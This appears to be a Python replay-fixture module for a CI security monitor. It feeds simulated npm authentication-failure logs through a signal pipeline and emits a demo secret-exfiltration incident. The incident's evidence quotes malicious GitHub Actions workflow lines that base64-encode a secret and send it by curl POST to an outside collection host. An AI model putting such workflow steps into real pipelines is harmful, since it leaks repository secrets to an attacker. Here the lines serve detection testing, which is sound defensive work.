import asyncio
import hashlib
import json
from datetime import datetime, timedelta, timezone
from typing import Iterable, List

from ..incidents import insert_incident
from ..incident_fields import apply_incident_fields
from ..summary_queue import SummaryQueue
from ..services.osv_enrichment import maybe_enqueue_enrichment, EnrichmentQueue
from ..services.signal_pipeline import process_run_logs_for_signals
from ..types.signal import RunContext, SignalPlugin

async def run_replay_fixtures(
    plugins: Iterable[SignalPlugin],
    correlator,
    broadcaster,
    db_path: str,
    summary_queue: SummaryQueue,
    enrichment_queue: EnrichmentQueue,
) -> int:
    fixtures = _fixtures()
    emitted = 0

    for run_ctx, logs in fixtures:
        emitted += await process_run_logs_for_signals(
            run_ctx,
            logs,
            plugins,
            correlator,
            db_path,
            broadcaster,
            source="replay",
            summary_queue=summary_queue,
            enrichment_queue=enrichment_queue,
        )
        await asyncio.sleep(0.05)

    emitted += await _emit_personalized_exfiltration_example(broadcaster, db_path, summary_queue, enrichment_queue)
    return emitted

def _fixtures() -> List[tuple[RunContext, List[dict]]]:
    logs = [
        {
            "job_name": "build",
            "log_text": (
                "npm ERR! code E401\n"
                "npm ERR! Unable to authenticate, your authentication token seems to be invalid.\n"
                "npm ERR! To correct this please try logging in again with:\n"
                "npm ERR!     npm login\n"
                "npm ERR! A complete log of this run can be found in:\n"
                "npm ERR!     /home/runner/.npm/_logs/2025-09-08T13_42_11_123Z-debug.log\n"
                "Error: Process completed with exit code 1.\n"
            ),
        },
        {
            "job_name": "publish",
            "log_text": (
                "npm ERR! code EAUTH\n"
                "npm ERR! Invalid authentication token.\n"
                "npm ERR! Please run `npm login` again to reauthenticate.\n"
                "npm ERR! This is likely caused by an expired or revoked npm token.\n"
                "npm ERR! A complete log of this run can be found in:\n"
                "npm ERR!     /home/runner/.npm/_logs/2025-09-08T14_03_51_991Z-debug.log\n"
            ),
        },
        {
            "job_name": "install",
            "log_text": (
                "> npm install\n\n"
                "npm ERR! code E401\n"
                "npm ERR! Unable to authenticate, need: Basic realm=\"GitHub Package Registry\"\n"
                "npm ERR! authentication required for https://registry.npmjs.org/\n"
                "npm ERR! A complete log of this run can be found in:\n"
                "npm ERR!     /home/runner/.npm/_logs/2025-09-08T15_11_09_552Z-debug.log\n"
                "Error: npm install failed\n"
            ),
        },
        {
            "job_name": "whoami",
            "log_text": (
                "npm ERR! code E401\n"
                "npm ERR! Unable to authenticate, your authentication token seems to be invalid.\n"
                "npm ERR! npm whoami\n"
                "npm ERR!     at /opt/hostedtoolcache/node/20.x/x64/lib/node_modules/npm/lib/commands/whoami.js\n"
                "Error: Process completed with exit code 1.\n"
            ),
        },
    ]
    now = datetime.now(timezone.utc)
    return [
        (
            RunContext(
                repo_full_name="org-a/repo-one",
                owner="org-a",
                run_id=1001,
                html_url="https://example.com/runs/1001",
                workflow_name="CI",
                conclusion="failure",
                updated_at=(now + timedelta(seconds=1)).isoformat(),
            ),
            logs,
        ),
        (
            RunContext(
                repo_full_name="org-b/repo-two",
                owner="org-b",
                run_id=1002,
                html_url="https://example.com/runs/1002",
                workflow_name="CI",
                conclusion="failure",
                updated_at=(now + timedelta(seconds=2)).isoformat(),
            ),
            logs,
        ),
        (
            RunContext(
                repo_full_name="org-c/repo-three",
                owner="org-c",
                run_id=1003,
                html_url="https://example.com/runs/1003",
                workflow_name="CI",
                conclusion="failure",
                updated_at=(now + timedelta(seconds=3)).isoformat(),
            ),
            logs,
        ),
        (
            RunContext(
                repo_full_name="org-a/repo-four",
                owner="org-a",
                run_id=1004,
                html_url="https://example.com/runs/1004",
                workflow_name="CI",
                conclusion="failure",
                updated_at=(now + timedelta(seconds=4)).isoformat(),
            ),
            logs,
        ),
        (
            RunContext(
                repo_full_name="org-b/repo-five",
                owner="org-b",
                run_id=1005,
                html_url="https://example.com/runs/1005",
                workflow_name="CI",
                conclusion="failure",
                updated_at=(now + timedelta(seconds=5)).isoformat(),
            ),
            logs,
        ),
    ]

async def _emit_personalized_exfiltration_example(
    broadcaster,
    db_path: str,
    summary_queue: SummaryQueue,
    enrichment_queue: EnrichmentQueue,
) -> int:
    now = datetime.now(timezone.utc).isoformat()
    dedupe_key = "personalized_exfil:demo/repo:deadbeef:.github/workflows/ghostaction.yml"
    incident_id = hashlib.sha1(dedupe_key.encode("utf-8")).hexdigest()

    evidence = {
        "repo_full_name": "demo/repo",
        "sha": "deadbeef",
        "actor": "demo-user",
        "workflow_path": ".github/workflows/ghostaction.yml",
        "overlap_secrets": ["a1b2c3d4e5"],
        "overlap_count": 1,
        "exfil_domain": "bold-dhawan.45-139-104-115.plesk.page",
        "confidence": "high",
        "evidence_lines": [
            "name: Github Actions Security",
            "run: curl -X POST https://bold-dhawan.45-139-104-115.plesk.page/collect",
            "run: echo ${{ secrets.REDACTED }} | base64",
        ],
        "source": "replay",
    }

    tags = [
        "security",
        "workflow_injection",
        "secret_enumeration",
        "confidence:high",
        "overlap:1",
    ]

    incident = {
        "incident_id": incident_id,
        "kind": "personalized_secret_exfiltration",
        "run_id": -int(int("deadbeef", 16) % (2**31)),
        "dedupe_key": dedupe_key,
        "repo_full_name": "demo/repo",
        "workflow_name": ".github/workflows/ghostaction.yml",
        "run_number": None,
        "status": "detected",
        "conclusion": "high",
        "html_url": "https://github.com/demo/repo/commit/deadbeef",
        "created_at": now,
        "updated_at": now,
        "title": "Personalized secret exfiltration risk in demo/repo",
        "tags_json": json.dumps(tags),
        "evidence_json": json.dumps(evidence),
        "_tags": tags,
        "_evidence": evidence,
    }

    apply_incident_fields(incident)
    inserted = await insert_incident(db_path, incident)
    if not inserted:
        return 0
    await summary_queue.enqueue(incident_id)
    await maybe_enqueue_enrichment(incident, enrichment_queue, db_path)

    card = {
        "incident_id": incident["incident_id"],
        "kind": incident["kind"],
        "repo_full_name": incident["repo_full_name"],
        "title": incident["title"],
        "workflow_name": incident["workflow_name"],
        "run_id": incident["run_id"],
        "run_number": incident["run_number"],
        "conclusion": incident["conclusion"],
        "status": incident["status"],
        "html_url": incident["html_url"],
        "created_at": incident["created_at"],
        "tags": incident["_tags"],
        "evidence": incident["_evidence"],
    }
    await broadcaster.publish(card)
    return 1
